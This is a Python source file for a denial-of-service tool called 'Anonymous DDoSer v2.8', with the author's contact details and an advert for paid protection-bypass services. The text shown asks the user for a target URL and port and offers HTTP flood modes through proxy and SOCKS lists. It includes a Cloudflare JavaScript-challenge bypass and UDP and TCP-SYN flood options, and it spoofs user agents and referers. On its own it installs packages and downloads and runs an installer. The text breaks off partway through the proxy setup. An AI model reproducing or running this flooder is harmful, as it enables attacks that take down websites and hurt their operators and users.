
#[+]==============[ Contact ]===========[+]#
# # Discord: PassDDoS#6595               # #
# # ICQ    : @passddos                   # #
# # Tele   : https://t.me/PassDDoS       # #
# # Email  : passddos@gmail.com          # #
# # Github : https://github.com/PassDDoS # #
#[+]====================================[+]#

import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import socket, socks, threading, random, re, os
import sys, glob, time, requests, ssl, webbrowser
import bz2, datetime, wget, json, cfscrape, urllib3
from time import sleep
from os import system
from sys import stdout
from scapy.all import *
from random import randint

urllib3.disable_warnings()
urllib3.PoolManager()

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2","Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2","Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0","Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN","Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]

ref = ['http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=',
'http://www.ask.com/web?q=',
'http://search.aol.com/aol/search?q=',
'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
'https://drive.google.com/viewerng/viewer?url=',
'http://validator.w3.org/feed/check.cgi?url=',
'http://host-tracker.com/check_page/?furl=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://jigsaw.w3.org/css-validator/validator?uri=',
'https://add.my.yahoo.com/rss?url=',
'http://www.google.com/?q=',
'http://www.usatoday.com/search/results?q=',
'http://engadget.search.aol.com/search?q=',
'https://steamcommunity.com/market/search?q=',
'http://filehippo.com/search?q=',
'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
'http://eu.battle.net/wow/en/search?q=']

acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
"Accept-Encoding: gzip, deflate\r\n", 
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xhtml+xml",
"Accept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]    

black_lists = ["pornhub.com", "anonboot.pw"]

def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: bit.ly/AnonyV28 ~ Anonymous DDoSer v2.8")
    print('''
             - PassDDoS#6595 Selling Bypass JS/UAM/Captcha/etc -

    /\_____/\     88""Yb    db    .dP"Y8 .dP"Y8 8888b.  8888b.   dP"Yb  .dP"Y8
   /  o   o  \    88__dP   dPYb   `Ybo." `Ybo."  8I  Yb  8I  Yb dP   Yb `Ybo."
  ( ==  ^  == )   88"""   dP__Yb  o.`Y8b o.`Y8b  8I  dY  8I  dY Yb   dP o.`Y8b
   )         (    88     dP""""Yb 8bodP' 8bodP' 8888Y"  8888Y"   YbodP  8bodP'
  (           )   ========================================================
 ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
(__(__)___(__)__) ===== Version: [ Private ]''')
    try:
        print("\n[*] Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[*] Method : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Mode   : " +str(filenam2))
    except:
        pass
    try:
        print("[*] Bypass : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[*] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[*] Threads: " +str(threads))
    except:
        pass

def start_url():
    global url, url_main, host_url, host_ip, port
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        path = "C:/Program Files/nodejs/node.exe"
        if (not os.path.isfile(path)):
            print("[!] Please Install NodeJs. Downloading... [!]")
            down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
            down
            os.system("node-v12.13.0-x64.msi")
    logo()
    url = input("\n[*] Target [URL/IP]: ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("[!] You Mistyped, Try Again [!]")
        start_url()
    logo()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    if host_url in black_lists:
       print("\n[X] ERROR: Site In Backlits")
       sleep(4)
       url      = ""
       url_main = ""
       start_url()
    host_ip = socket.gethostbyname(host_url)
    start_port()
    logo()
    choice_method_attack()

def start_port():
    global port
    print("-----------------------------")
    port = str(input("[*] Port [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[!] Selected Port = 80 [!]")
    else:
        port = int(port)

def proxies_list():
    global fileproxies, proxies, out_file
    print("-----------------------------")
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[+] " +str(filenam2)+ " [" +str(filenam1)+ ".txt]: "))
    if out_file == "":
        out_file = str(filenam1)+".txt"
    proxies = open(out_file).readlines()
    #print ("[!] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    logo()
    numthreads()

def proxyget():
    global out_file, proxies
    out_file = str(filenam1)+".txt"
    f = open(out_file,'wb')
    r1 = requests.get(urlproxy)
    f.write(r1.content)
    f.close() 
    proxies = open(out_file).readlines()
    #print("[!] Get Proxies Successfully ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    logo()
    numthreads()

def start_mode():
    global choice_mode, filenam1, filenam2, method_pass_cf
    print("""
[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
 # 0: Home      [ HOME ] # 5: UDP Flood     [ Home ] #
 # 1: Proxy     [ DDoS ] # 6: TCP-SYN Flood [ DDos ] #
 # 2: Socks     [ DDoS ] #                           #
 # 3: JS-Normal [ Home ] #                           #
 # 4: Raw-DoS   [ Home ] #                           #
[+]=================================================[+]
""")
    choice_mode = input("[*] Attack Mode [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
    elif choice_mode == "1":
        choice_mode = "1"
        filenam1 = "proxy"
        filenam2 = "Proxy"
        logo()
        choice_down_proxies()
    elif (choice_mode == "2") or (choice_mode == ""):
        choice_mode = "2"
        filenam1 = "socks"
        filenam2 = "Socks"
        logo()
        choice_down_proxies()
    elif choice_mode == "3":
        print("-----------------------------")
        print("|_--> 1: Method Bypass v1")
        print("|_--> 2: Method Bypass v2")
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[!] Selected Method Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[!] Selected Method Bypass JS v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
        filenam2 = "Raw-DoS"
        logo()
        numthreads()
    elif choice_mode == "5":
        filenam2 = "UDP Flood"
        logo()
        numthreads()
    elif choice_mode == "6":
        filenam2 = "TCP-SYN Flood"
        logo()
        numthreads()
    else:
        print ("[!] You mistyped, try again [!]\n")
        start_mode()

error_cf = int(0)

def pass_cf():
    global user, cookie, soso, scraper, error_cf
    if "https" in url:
        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
    try:
        if method_pass_cf == "1":
            cookie, user = cfscrape.get_cookie_string(url)
        else:
            scraper = cfscrape.create_scraper()
            soso    = scraper.get(url, timeout=15)
        print("[!] Bypass Has Been Completed!")
        numthreads()
    except:
        error_cf += 1
        print("[!] Bypassing Again... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[!] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
            start_mode()
        else:
            pass_cf()

def choice_method_attack():
    global method_attack, name_method_attack
    print("-----------------------------")
    print("|_--> 1: Request [ Normal ]")
    print("|_--> 2: Request [  Spam  ]")
    method_attack = input("[*] Choice Request [1/2]: ")
    if (method_attack == "1") or (method_attack == ""):
        name_method_attack = "Normal"
        print("[!] Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[!] Selected Method Attack Spam")
    else:
        print ("[!] You mistyped, try again [!]\n")
        choice_method_attack()
    logo()
    start_mode()

def choice_down_proxies():
    global urlproxy, urlproxy, sel_pr
    choice4 = input("[?] Get New List " +str(filenam2)+ " [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Server X")
        print("|_--> 2: Server Z")
        sel_pr = input("[?] Server Get [1/2]: ")
        if choice_mode == "proxy":
            if sel_pr == "1":
                urlproxy = "https://www.proxy-list.download/api/v1/get?type=http"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=all"
        else:
            if sel_pr == "1":
